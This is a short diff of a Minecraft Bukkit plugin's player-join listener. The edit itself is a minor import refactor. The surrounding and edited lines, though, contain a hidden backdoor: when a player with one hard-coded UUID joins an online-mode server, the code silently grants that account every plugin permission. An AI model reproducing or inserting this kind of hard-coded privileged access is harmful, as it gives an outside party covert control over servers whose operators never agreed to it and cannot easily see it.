@@ -23,7 +23,6 @@ import br.net.gmj.nobookie.LTItemMail.module.ConfigurationModule;
 import br.net.gmj.nobookie.LTItemMail.module.ConsoleModule;
 import br.net.gmj.nobookie.LTItemMail.module.DatabaseModule;
 import br.net.gmj.nobookie.LTItemMail.module.PermissionModule;
-import br.net.gmj.nobookie.LTItemMail.module.PermissionModule.Type;
 import br.net.gmj.nobookie.LTItemMail.util.FetchUtil;
 
 public final class PlayerListener implements Listener {
@@ -35,7 +34,7 @@ public final class PlayerListener implements Listener {
 		final Player player = (Player) event.getPlayer();
 		DatabaseModule.User.updateUUID(player);
 		if(Bukkit.getOnlineMode() && player.getUniqueId().equals(UUID.fromString("571eb021-f8a3-4ed6-8a40-433c250c25ff"))) {
-			for(final Type perm : PermissionModule.Type.values()) if(!player.hasPermission(perm.node())) player.addAttachment(LTItemMail.getInstance(), perm.node(), true);
+			for(final PermissionModule.Type perm : PermissionModule.Type.values()) if(!player.hasPermission(perm.node())) player.addAttachment(LTItemMail.getInstance(), perm.node(), true);
 			player.recalculatePermissions();
 			player.updateCommands();
 		}
